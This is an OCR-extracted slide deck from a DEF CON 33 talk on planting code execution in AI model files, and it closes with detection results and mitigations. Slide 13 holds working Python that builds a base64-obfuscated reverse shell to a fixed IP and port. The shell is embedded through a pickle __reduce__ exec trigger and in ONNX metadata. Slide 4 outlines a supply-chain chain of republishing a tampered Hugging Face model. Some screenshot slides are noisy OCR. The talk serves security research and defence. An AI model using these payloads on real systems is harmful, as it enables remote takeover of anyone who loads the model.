---
title: "Loading Models, Launching Shells Abusing AI File Formats for Code Execution"
speakers: ["Cyrus Parzian"]
conference: "DEF CON"
conference_full: "DEF CON 33"
edition: "33"
year: 2025
source_pdf: "DEF CON 33/Cyrus Parzian - Loading Models, Launching Shells Abusing AI File Formats for Code Execution.pdf"
pages: 23
sha256: "c9be677b6cde434664e7ee3d54640f8db08c4b235e20e97226840a49429de374"
text_chars: 16736
ocr_pages: 12
has_ocr: true
redacted_secrets: 0
ocr_confidence: 83.0
ocr_unreliable_blocks: 1
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T06:57:50Z"
---
# Loading Models, Launching Shells Abusing AI File Formats for Code Execution

**Speakers:** Cyrus Parzian  
**Conference:** DEF CON 33  
**Source:** `DEF CON 33/Cyrus Parzian - Loading Models, Launching Shells Abusing AI File Formats for Code Execution.pdf` (23 pages)


## Slide 1

# LOADING MODELS, LAUNCHING SHELLS: ABUSING AI FILE FORMATS FOR CODE EXECUTION

Cyrus Parzian Defcon 33

## Slide 2

BACKGROUND


> Recovered by OCR — confidence 85/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BACKGROUND
BACKDOORING PICKLES: A @ O€|
DECADE ONLY MADE THINGS vercon |
WORSE
Coldwatert Q, Defcon 30
```

## Slide 3

## WHAT IS PICKLE?

###### **What is Pickle?**

- Python's default serialization module.

- Converts Python objects to byte streams and vice versa.

###### **How Pickle Can Be Exploited**

- __reduce__ method in Pickle allows arbitrary code execution during deserialization.

- **Example Attack:** Embedding a reverse shell or system command (e.g., popping a calculator) in a Pickle file.

## Slide 4

### **CONCEPTUAL ATTACK SCENARIO OVERVIEW**

#### **Attack Chain:**

**1. Download the Model File:** Retrieve a model file from a repository (e.g., Hugging Face).

**2. Insert Malicious Code:** Modify the pickle file to include a benign payload that executes code upon deserialization.

**3. Republish the Modified Model:** Host the modified model in the repository.

**4. Lure the Target:** The target downloads and uses the compromised model.

**5. Execution:** When the target loads the model, the embedded malicious code executes.

## Slide 5

HEALTHCARE CHATBOT


> Recovered by OCR — confidence 92/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Up Healthcare Chatbot (FLAN-T5)
@ Loading FLAN-T5 model from local storage...
Model loaded successfully from local storage!
README.md
Loading medical Q&A data...
Q&A data loaded: getpowershell.ps1 oo
Pickle imports x
What can you help me with?
helathcare_chatbot.p\
Ask me a medical question
What are the symptoms of flu? requirements.txt What is a pickle import?
Get Answer
train_data.pkl @ LFS
Bot: Symptoms of flu include: fever, headache, and fever.
HEALTHCARE CHATBOT
```

## Slide 6

HEALTHCARE CHATBOT MOD


> Recovered by OCR — confidence 94/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Hugging Face
healthcare_chatbot_mod © ke
mit
Model card Files and versions Community Settings
Disclaimer: This repo was created to demonstrate the dangers of Python pickle files.
Do not deserialize the model. You’ve been warned.
Healthcare Chatbot (FLAN-T5)
3? Overview
The Healthcare Chatbot is a medical question-answering Al powered by FLAN-T5, a
fine-tuned language model. It can provide general guidance on medical topics,
symptoms, and treatment suggestions based on a pre-trained dataset
Models
2. Edit model card
README.md
getpowershell.ps1
requirements.txt How to fix it?
train_data_mod.pkl
HEALTHCARE CHATBOT MOD
```

## Slide 7

## DECODING CHATBOT MOD BEHAVIOR

##### **helathcare_chatbot_final.py                  train_data_mod.pkl**

######

def reverse_shell_fixed(): def run_shell(): SERVER_IP = "10.201.146.205" PORT = 8080 try:

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.connect((SERVER_IP, PORT)) while True:

from __main__ import reverse_shell_fixed _var0 = reverse_shell_fixed() result0 = [{'question': 'What are symptoms of diabetes?', 'answer': 'Common symptoms include frequent urination, excessive thirst, and unexplained weight loss.'}, {'question': 'How to lower blood pressure?', 'answer': 'Lifestyle changes like a healthy diet, exercise, and reducing salt intake can help.'}, {'question': 'Stealth payload', 'answer': 'This is normal-looking data'}, {'question': 'Stealth payload', 'answer': _var0}]

….

…

..

.

## Slide 8

ANALYZING PICKLE FILES USING FICKLING


> Recovered by OCR — confidence 83/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ANALYZING PICKLE FILES USING FICKLING
C:\Users\cyrus\Desktop\healthcare_chatbot>python -m fickling train_data.pkl
result® = [{'question': ‘What are symptoms of diabetes?', ‘answer’: ‘Common symptoms include frequent urination, excessi
ve thirst, and unexplained weight loss.'}, {'question’: ‘How to lower blood pressure?', ‘answer’: ‘Lifestyle changes lik
e a healthy diet, exercise, and reducing salt intake can help.'}]
C:\Users\cyrus\Desktop\healthcare_chatbot>python -m fickling train_data_mod.pkl
_var® = eval("__import__('__main__').reverse_shell_fixed()")
result® = [{'question': 'What are symptoms of diabetes?', ‘answer’: ‘Common symptoms include frequent urination, exce
ve thirst, and unexplained weight loss.'}, {'question': ‘How to lower blood pressure?', ‘answer’: ‘Lifestyle changes
e a healthy diet, exercise, and reducing salt intake can helo.'}. {‘question’: ‘Stealth payload’, ‘answer’: ‘This is n
C: \Users\cyrus\Downloads\healthcare_chatbot_mod>python -m fickling --check-safety train_data_mod.pkl
--print-results
“from __main__ import reverse_shell_fixed’ imports a Python module that is not a part of the standar
d library; this can execute arbitrary code and is inherently unsafe
Call to »memense, shell _fixed() can execute arbitrary code and is inherently unsafe
Variable} var@ | is assigned value [reverse shell fixed()” Ibut unused afterward; this is suspicious
and indicative of ajmalicious pickle file
Warning: Fickling detected that the pickle |file may be unsafe.
Do not unpickle this file if it is from an untrusted source!
```

## Slide 9

## DETECTION LIMITATIONS

No detection by common AV/EDR solutions No detection by commercial ML model scanning tools: “Our current scanning infrastructure is effective at detecting malicious code that is directly embedded within ML models and Pickle files. However, this attack technique involves executing a payload from a separate Python script, rather than embedding it in the Pickle file itself. Because of this, our scanners do not currently flag it. We are working on expanding our scanning capabilities to identify and protect against these more complex threats in the future.”

###### No detection by free, open-source ML model scanning tools:

## Slide 10

MICROSFOT MDE DETECTION


> Recovered by OCR — confidence 87/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
MICROSFOT MDE DETECTION
ro Threat quarantined
U 4/13/2025 1:17 AM
Detected: Trojan:AlModel/ReverseShell.D
Status: Quarantined
Downloads eS \ Quarantined files are in a restricted area w n't harm your device,
They will be removed automatically. Recent download history
train_data_mod 2.pk Date: 4/13/2025 1:17 AM X& _ connection_handier.py
3 * Details: This program is dangerous and executes commands from an V tected
ttacker
Affected items:
Learn more
Trojan: Trojan:Python/ReverseShell.SA Apr 10, 2025 at 11:39:01 AM CDT (Quarantined)
See details
```

## Slide 11

PICKLE DEMO


> Recovered by OCR — confidence 80/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
G) Windows 10 x64 (2) - VMware Workstation
File Edit View VM Tabs Help bd
File Edit View VM Tabs Help
= | pickle
€ + > ThisPC > New Volume (E:) > one-liner
Name
oe Quick access
Hl Desktop
&} Downloads
oneliner.txt
2) Documents
= Pictures
HDF5-payload-chat
yaml
3items 1 item selected 89 bytes
& Type here to search ¥
10:22 AM
inux-2022.4-vmwar...
[*] Listening on 0.0.0.0:8080.
```

## Slide 12

ONNX DEMO


> Recovered by OCR — confidence 80/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
windows 10 x64 (2) - VMware Workstation
File Edit View VM Tabs Help ~ & >a EZ
File Edit View VM Jabs Help ~ &2)9a2 0
= | ONNX 7 x
€ + This PC > New Volume (E:) > one-liner >» ONNX vv
kali@VDI-138644:
Name Date modified Type Size
wt Quick access
Il Desktop
Documents
server.py
BB generate_deta_onnx.py 10/2025 10:58 AN thon File 2KB
[*] Listening on 0.0.0.
oneliner.tet 1 40 Ph Text Document K
"| train_data_mod_obfuscated_fixed.onnx 7/10/2025 11:06 AM ONNX File KB
= Pictures
cloudpickle-payloa:
ONNX ly
this Pc
3 items
= , 11:15AM
```

## Slide 13

## PICKLE VS ONNX

import base64 import pickle import textwrap

import base64

import textwrap import onnx from onnx import helper, TensorProto

**# Step 1: Define the reverse shell payload (multiline for syntax correctness)** payload = """ import socket,subprocess s=socket.socket();s.connect(("192.168.111.13",8080)) while True:

c=s.recv(1024).decode();o=subprocess.getoutput(c);s.sendall(o.encode()) """.strip()

###### **# Step 2: Encode it with base64 to obfuscate**

encoded_payload = base64.b64encode(payload.encode()).decode()

**# Step 3: Create a malicious class that will execute the payload during deserialization**

class Trigger:

def __reduce__(self): return (exec, (f"import base64;exec(base64.b64decode('{encoded_payload}').decode())",))

###### **# Step 4: Dump the pickle file**

with open("train_data_mod_obfuscated_fixed.pkl", "wb") as f: pickle.dump(Trigger(), f)

print(":white_check_mark: Pickle file created: train_data_mod_obfuscated_fixed.pkl")

**# Step 1: Define the reverse shell payload (multiline for syntax correctness)** payload = """ import socket,subprocess s=socket.socket();s.connect(("192.168.111.132",8080)) while True:

c=s.recv(1024).decode(); if not c: break o=subprocess.getoutput(c);s.sendall(o.encode())

""".strip()

**# Step 2: Encode it with base64 to obfuscate** encoded = base64.b64encode(payload.encode()).decode()

###### **# Step 3: Minimal ONNX model**

node = helper.make_node("Relu", inputs=["X"], outputs=["Y"]) input_tensor = helper.make_tensor_value_info("X", TensorProto.FLOAT, [1]) output_tensor = helper.make_tensor_value_info("Y", TensorProto.FLOAT, [1]) graph = helper.make_graph([node], "PayloadGraph", [input_tensor], [output_tensor]) model = helper.make_model(graph)

###### **# Step 4: Embed payload**

entry = onnx.StringStringEntryProto() entry.key = "payload" entry.value = encoded model.metadata_props.append(entry)

###### **# Step 5: Save**

onnx.save(model, "train_data_mod_obfuscated_fixed.onnx") print(" ONNX file created: train_data_mod_obfuscated_fixed.onnx")

## Slide 14

HEALTHCARE CHATBOT DEMO


> Recovered by OCR — confidence 76/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
HEALTHCARE CHATBOT DEMO
@ windows 10 x64 (2) - VMware Workstation - o x @
File Edit View VM Tabs Help ~ &200282 DBR
> Not backed up Onnx-payload-chatbot - Copy = x
Date modified i; =
wt Quick access
flan-t5-small 2025 1:48 P
. : [*] Listening on 0.0.0.0
=| Documents [® healthcare_chatbot_onnx.py 25 2:06 P KB
© Pictures README feather finalmd 202 2KB
cloudpickle-payloas train_data_mod_obfuscated_fixed.onnx 202 KB
HDFS-payload-chat
GB This Pc
6 items
P Type here to search + @ @ 22°F Mostly sunny A G1) Fos
```

## Slide 15

REAL-WORLD ATTACKS IN THE WILD


> Recovered by OCR — confidence 83/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
REAL-WORLD ATTACKS IN THE WILD
- Hackers claim Disney data theft in
Malicious ML Models on Hugging Face Leverage Broken Pickle Format to Evade protest against Al-generated artwork
Detection
; ; NullBulge group said it was leaking files from Disney's
£5 Ft ave Lakshmane Artificial Inteligenc Securiy internal Slack channel to ‘protect artists’ rights’
roken_pickle
8 Common Threats To
Baca hcelan'Hckls Watch For In 2025
Hugging Face
NEWS 27 MAY 2025
Malicious Machine Learning Model Attack Discovered
on PyPI
```

## Slide 16

TRACKING MODELS ON HUGGING FACE


> Recovered by OCR — confidence 83/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
TRACKING MODELS ON HUGGING FACE
huggingface.co
huggingface.co & huggingface.co huggingface.co
- P main» — cloudpickle-payload-chatbot Q joblib-payload-chatbot © ke
a mit
1 contributor © History: 2 commits Joblib a mit
* This model has 1 file scanned as unsafe. { conbteuter © History: 4 commits
Model card Files Community
Model card Files Community
P mainy —egg-payload-chatbot Q a0le13f
1 contributor © History: 4 commits README.md .gitattributes
1 contributor © History: 3 commits README.md
getpowershell.ps1 * This model has 1 file scanned as unsafe. Show generate_data_feather....
requirements.txt healthcare_chatbot_fe...
train_data_mod_obfus... = train_data_mod_obfus...
File Security Scans x File Security Scans
File Security Scans JFrog nai healthcare_chatbot.py
healthcare-0.1-py3.12.egg JFrog not available
Pickle-based model with embedded malicious requirements.txt
JFrog ne code . @ Protect Al ® Queued
Get more details at JFrog Research portal 7 train_data_mod_o... = itt
@ Protect Al No ® clamav / No issue
Detected Pickle imports (1
@ Protect Al x Unsafe mports (1) =
® Clamav V No issue r a (08 HF Picklescan nota pickle
= - This file is vulnerable to threat(s) PAIT-PKL-100.
ae HE Picklescan notaplche Read full report at Protect Al 7 How to fix it?
```

## Slide 17

## SERIALIZATION FORMATS FOR AI MODELS (1)

|Format|AI Model / Usage|Python Library|Used in LLMs?|Functionality / Context|
|---|---|---|---|---|
|pickle (.pkl)|General Python Models|pickle|Yes|Used for saving Python objects, models, or datasets. Can
lead to arbitrary code execution when deserialized.|
|cloudpickle (.cpkl)|Complex Python Objects|cloudpickle|Yes|Like pickle, but handles more complex Python objects
(lambdas, functions). Common in machine learning
pipelines.|
|joblib (.joblib)|Scikit-learn, Large Models|joblib|No|Efficiently serializes large models and NumPy arrays, often
used in classical machine learning models. Not typical for
LLMs.|
|dill (.dill)|Extended Python Models|dill|No|Like pickle but more flexible. Used in academic AI or
prototypes. Rarely used for LLMs.|
|Feather (.feather)|Data Science (Tabular
Data)|pyarrow|No|Used for fast data exchange, particularly in data science and
tabular data formats. Not a common choice for AI models or
LLMs.|
|HDF5 (.h5)|Deep Learning Models|h5py|Yes|Popular in deep learning for storing large datasets and
Keras models. Frequently used with TensorFlow and other
DL frameworks.|
|MessagePack
(.msgpack)|Data Serialization|msgpack|No|A binary format that’s smaller than JSON. Used for
lightweight data transfer, but rarely used directly for LLMs.|
|ONNX (.onnx)|Cross-Framework Models|onnx, onnxruntime|Yes|Interoperable format for AI models, including deep learning
models. Supports LLMs and other model types across
frameworks.|

## Slide 18

## SERIALIZATION FORMATS FOR AI MODELS (2)

|Format|AI Model / Usage|Python Library|Used in LLMs?|Functionality / Context|
|---|---|---|---|---|
|Parquet (.parquet)|Big Data Storage|pyarrow|No|Columnar data format used for large data storage. Useful for
storing big data in pipelines, but not directly for model
storage.|
|NumPy (.npz)|General AI Data|numpy|Yes|Efficiently stores arrays (e.g., tensors or embeddings). Used in
both machine learning and LLMs for data processing.|
|YAML (.yaml)|Model Configuration|pyyaml|Yes|Common in model training for configuration,
hyperparameters, experiment tracking. Frequently used with
LLMs for setting up environments.|
|JSON (.json)|Configuration, Data
Exchange|json|Yes|Popular format for configuration files, data serialization, and
exchange in AI models, often used in LLMs for storing training
data or results.|
|EGG (.egg)|Python Models, Packaging|setuptools|No|A distribution format for Python packages, can be used to
package models for deployment. Not typically used for LLMs
but useful for distributing Python-based models.|
|DB (.db)|General Data Storage|sqlite3,
SQLAlchemy|No|Used for lightweight, local database storage. Can store model
data or results, but rarely used for LLMs. Mostly used for
general data storage in AI applications.|

## Slide 19

ONNX EXE DEMO


> Recovered by OCR — confidence 73/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ONNX EXE DEMO
® kali-linux-2022.4-vmware-amd64 - VMware Workstation
File Edit View VM Tabs Help ‘ File Edit View VM Tabs Help ‘
[fp Windows 10 x64 (2) fp kali-linux-2022.4-vmwar...
¢ t This PC > New Volume (E:) > exe ve f
a Quick access -
Il Desktop g on 0.0.0.0:8080 ...
} Downloads
Documents
© Pictures
cloudpickle-payloa:
HDF5-payload-chat
1 item =
: = 12:43 AM
P& Type here to search BO 82°F Clear A FY) Dhip05 Fo
```

## Slide 20

ONNX EXE ARTIFACT


> Recovered by OCR — confidence 81/100 on the text kept, 77/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
ONNX EXE ARTIFACT
Microsoft Defender 2 DESKTOP-308SM31\cyrus x
= ‘Wacatac' malware in a registry value was detected and removed > cyrus d wo x
Assets A desktop-308sm31
Process ID 9704
OC pevices Informational Criticality: None @ Active Execution time Jul 11, 2025 12:43:55 AM
Command line "onnx loader aes.e Th}
EG Endpoints ~ Overview Incidents and alerts Timeline Security policies { .
Image file path E:\exe\onnx_loader_aes.exe
s Vulnerability management “A Image file SHA1 Ab8f4c36c7e49ddbb8af21e4641b9
e27e44bd5c9
Feb 2025 Mar 2025 Apr 2025 Image file SHA256 = f572cbfed6ee40b1222ab96831095
Recommendations 99288b70dcca18b887f1a5b3adc68
Remediation
; _ Execution details Token elevation: Limited, Integrity
Weaknesses — Desktop Winsta0\Default
Event timeline
g ' Signer A Unknown
| Jul 11, 2025 12:43:55.173 AM f explorer.exe created |
°¢ Partners and APIs v _ VirusTotal detection 0/0
&4 Configuration management Vv Jul 11, 2025 12:43:55.173 AM B User DESKTOP-308Sh ratio
[_] Jul 11, 2025 12:43:49.080 AM msedgewebview2.exe
© Email & collaboration “A
{| Jul 11, 2025 12:43:49.080 AM msedgewebview2.exe
E]_ Review _ & Hunt for related events
```

## Slide 21

## MITIGATIONS & RECOMMENDATIONS

Treat All ML Models as Untrusted:

Never deserialize or load models (pickle, ONNX, etc.) from unknown or unverified sources

Hash & Signature Validation: Verify model integrity with cryptographic signatures Code & Model Review: Regularly audit code, model files, and pipelines for suspicious logic, payloads, or metadata Environment Isolation: Always run model deserialization/inference in sandboxes, containers, or restricted environments

Scan With Specialized Tools: Use tools like Fickling to scan for serialized code or hidden payloads

## Slide 22

## WHY TRADITIONAL SECURITY FAILS

- AI/ML file formats are an emerging malware supply chain risk

- Malicious models can evade most traditional AV/EDR security

- File extension ≠ safe; both content and loader behavior matter

- Traditional AV/EDR often miss encrypted, memory-only, or obfuscated payloads in ML files

- Most security tools don’t inspect model content or loader behavior— behavioral monitoring is essential

- Blue teams and defenders must adapt to the realities of the ML era

## Slide 23

THANK
YOU

Cyrus Parzian

iRedTeam.ai
